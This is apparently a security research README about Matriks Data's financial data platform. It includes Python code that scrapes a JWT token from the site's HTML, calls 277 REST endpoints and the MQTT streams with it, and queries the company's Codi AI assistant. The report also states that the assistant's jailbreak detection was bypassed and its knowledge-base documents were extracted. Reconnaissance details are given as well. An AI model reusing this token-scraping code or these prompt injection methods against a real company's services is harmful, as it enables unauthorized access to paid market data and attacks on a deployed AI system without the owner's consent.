# Matriks Data — API & Infrastructure Research

## Overview
Comprehensive security research on matriksdata.com (Matriks Finansal Teknolojiler A.S.)
financial data platform, including REST API, MQTT real-time streaming, Codi AI assistant,
and Borsa Istanbul data infrastructure.

## Key Findings

### 1. JWT Token (Auth Bypass)
- JWT token embedded in website HTML: `var password = 'eyJhbG...'`
- No login required — token refreshes on every page load
- RS256 signed, issuer=MATRIKSDATACOM, 5-hour validity
- Grants full REST API + MQTT access

### 2. REST API — 277 Endpoints (Full Access)
- Base: `https://api.matriksdata.com/dumrul/`
- Auth: `Authorization: jwt <token>`
- Discovery: `https://api.matriksdata.com/disco-v2.json?issuer=MATRIKSDATACOM`

**Endpoints:**
| Category | Count | Examples |
|----------|-------|---------|
| Bar/Price Data | 3 | 1min, 5min, 1hour, 1day OHLCV |
| Symbol Metadata | 5 | 20,388 symbols with full details |
| News | 5 | Real-time + AI sentiment analysis |
| Broker Volume | 3 | Stock, Future, Option |
| Agent Assets | 4 | Foreign/domestic investor data |
| ARF Rules | 10 | Alert Rule Framework CRUD |
| Bonds | 1 | ISIN-based bond lookup |
| Market Symbols | 2 | Full symbol lists |

**Symbol Types (20,388 total):**
| Type | Count | Description |
|------|-------|-------------|
| S | 689 | BIST Stocks |
| V | 10,543 | VIOP Derivatives/Futures |
| O | 2,461 | Options |
| E | 2,636 | Global Futures (Brent, S&P500) |
| K | 1,382 | Crypto (Binance Futures) |
| I | 1,039 | Indices |
| F | 682 | Funds |
| B | 19 | Bonds/Treasury |
| M | 58 | RE-PIE Funds |
| D | 1 | VIOP USD/TRY |

### 3. MQTT Real-Time Streaming
- **Real-time:** `wss://rtstream.radix.matriksdata.com:443`
- **Delayed:** `wss://dlstream.radix.matriksdata.com:443`
- **TCP:** `tcp://rtstream.radix.matriksdata.com:34452`
- Auth: JWT token as MQTT password
- Channels: mx/symbol, mx/derivative, mx/news, mx/stats, mx/analytics
- Topic format: `mx/symbol/SYMBOL@lvl2`

### 4. Codi AI — RAG System
- Endpoint: `POST https://matriksdata.com/codi/Search/Search`
- Body: `{"query": "...", "topK": 10, "applicationFilter": 1|2}`
- app=1: MatriksIQ docs, app=2: MatriksPrime docs
- 15 documents in knowledge base
- Jailbreak detection present but bypassable
- Contains BIST stock lists, forex pairs, crypto symbols

**Documents extracted:**
1. OBASE — Sık kullanılan semboller
2. IQ_TEKNIK_DESTEK — Log paths, file locations
3. CrossMov Stratejisi
4. ALL_USDT_FBIN — Binance USDT pairs
5. Borsa Istanbul Veri Lisanslari
6. Formullu Fiyat Penceresinden Emir Gönderimi
7. VERSIYON 4.1.2
8. C# Temel Kavramlar
9. VERSIYON 4.1.3
10. Dedektor Stratejisi
11. Versiyon 5.1.0.5
12. Sistem Ozellikleri
13. Derinlik Stratejisi
14. ARENA — Stock metadata with ISIN
15. Binance SSL troubleshooting

### 5. Infrastructure
- **WAF:** F5 BIG-IP / TrafficShield
- **Backend:** ASP.NET Core (www), ASP.NET WebForms (store), IIS/10.0 (destek)
- **MQTT Broker:** radix.matriksdata.com
- **DNS:** ns1/ns2.matriksdata.com (AXFR denied)
- **TLS:** 1.3 supported, 1.0/1.1 rejected, HSTS enabled

### 6. Data Access Examples
```python
# Get JWT token
import urllib.request, re
html = urllib.request.urlopen("https://www.matriksdata.com/website/").read().decode()
jwt = re.findall(r"var\s+password\s*=\s*['\"]([^'\"]+)['\"]", html)[0]

# Get BIST stock bars (daily OHLCV)
url = "https://api.matriksdata.com/dumrul/v1/tick/bar?symbol=GARAN&period=1day&start=2024-01-01&end=2024-07-01"
req = urllib.request.Request(url, headers={"Authorization": f"jwt {jwt}"})
data = json.loads(urllib.request.urlopen(req).read())

# Get all symbols (20,388)
url = "https://api.matriksdata.com/dumrul/v3/meta/symbols?allSymbols=true"

# Get real-time news with AI sentiment
url = "https://api.matriksdata.com/dumrul/v2/news/lastN?count=50"

# Query Codi AI
import json
payload = json.dumps({"query": "MatriksIQ nedir?", "topK": 10, "applicationFilter": 1}).encode()
req = urllib.request.Request("https://matriksdata.com/codi/Search/Search",
    data=payload, headers={"Content-Type": "application/json"})
response = json.loads(urllib.request.urlopen(req).read())
```

## Files
- `api/disco-v2.json` — Full API discovery document (277 endpoints)
- `api/symbols.json` — All 20,388 symbols with metadata
- `api/bar_data.json` — BIST stock bar data samples
- `api/news.json` — 50 news items with AI sentiment analysis
- `api/news-meta.json` — News sources and categories
- `api/price-step.json` — Price step configuration
- `api/session-hours.json` — Market session hours
- `api/topach.json` — MQTT topic configuration
- `codi/document_titles.txt` — 15 Codi knowledge base documents
- `codi/document_extracts.json` — Raw document content extracts
- `codi/advanced_attacks.json` — Prompt injection attack results
- `codi/forex_symbols.txt` — 257 forex pairs from Codi
- `codi/crypto_symbols.txt` — 500+ crypto symbols from Codi
- `codi/commodity_symbols.txt` — Commodity symbols from Codi
- `codi/bond_symbols.txt` — Bond/treasury symbols from Codi
- `infra/nmap_scan.txt` — Full nmap scan results
- `infra/mqtt_brokers.json` — MQTT broker endpoints

## Disclaimer
This research is for educational purposes only. All data was obtained from publicly accessible endpoints.
